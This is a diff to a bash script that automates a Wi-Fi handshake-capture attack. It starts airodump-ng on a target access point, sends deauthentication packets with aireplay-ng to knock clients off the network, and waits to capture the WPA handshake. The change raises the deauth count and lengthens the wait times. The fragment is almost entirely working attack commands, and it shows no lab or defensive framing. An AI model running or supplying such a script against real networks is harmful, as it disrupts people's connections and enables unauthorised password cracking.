@@ -62,7 +62,7 @@ echo "[+] Channel: $CHANNEL"
 
 xterm -hold -e "airodump-ng --bssid $BSSID -c $CHANNEL -w capture $MONITOR_INTERFACE" &
 
-sleep 8
+sleep 20
 
 # ==========================================
 # Send deauthentication packets
@@ -70,14 +70,14 @@ sleep 8
 
 echo "[+] Sending deauthentication packets..."
 
-aireplay-ng --deauth 15 -a $BSSID $MONITOR_INTERFACE
+aireplay-ng --deauth 25 -a $BSSID $MONITOR_INTERFACE
 
 # ==========================================
 # Wait for handshake
 # ==========================================
 
 echo "[+] Waiting for handshake..."
-sleep 20
+sleep 50
 
 # ==========================================
 # Check handshake
